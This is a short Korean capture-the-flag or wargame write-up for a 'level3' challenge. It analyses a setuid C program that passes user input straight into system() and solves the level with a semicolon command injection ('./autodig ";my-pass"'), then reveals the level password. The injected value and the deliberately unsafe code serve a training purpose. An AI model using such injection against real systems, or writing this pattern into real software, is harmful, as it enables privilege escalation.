# 문제풀이

1. cat hint 명령어 입력결과 아래 코드가 출력되었다.

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char **argv){

    char cmd[100];

    if( argc!=2 ){
        printf( "Auto Digger Version 0.9\n" );
        printf( "Usage : %s host\n", argv[0] );
        exit(0);
    }

    strcpy( cmd, "dig @" );
    strcat( cmd, argv[1] );
    strcat( cmd, " version.bind chaos txt");

    system( cmd );

}

이를 이용하여 level4의 권한을 얻어라.

more hints.
- 동시에 여러 명령어를 사용하려면?
- 문자열 형태로 명령어를 전달하려면?
```

## 코드 분석

`argc`는 프로그램을 실행할 때 넘겨주는 인자의 개수이다.
ex) ls -s/ 명령어를 실행하면 argc[0] = ls, argc[1] = -s, argc[2] = /
총 3개의 인자 값을 가진다.
`argc`가 2가 아니면 `printf`함수가 실행되고 exit(0)이 실행되 프로그램이 종료된다.

`argc` 값을 2개 입력해 프로그램 종료를 막아야한다.

strcpy()는 'dig @'문자열을 cmd에 복사한다.
strcat()는 argc[1]을 cmd 뒤에 붙이는 기능이다.
결과적으로 cmd 내용은 아래와 같다.
`dig @argv[1] version.bind chaos txt`

### 추가 힌트

1. 동시에 여러 명령어를 사용하려면 명령어 사이에 ";" 세미콜론을 넣는다.
   ex) \$ sh; ls 명령어를 입력하면 sh 실행이 종료된 후 ls 명령어가 실행된다.
2. 문자열 형태로 명령어를 전달하려면 명령어를 ""로 묶어준다.

## 결과

`find / -user level4 2>/dev/null` 실행결과 `/bin/autodig`경로 획득
`./autodig ";my-pass"` 실행 # `argc[0] = autodig , argc[1] = my-pass`

password : suck my brain
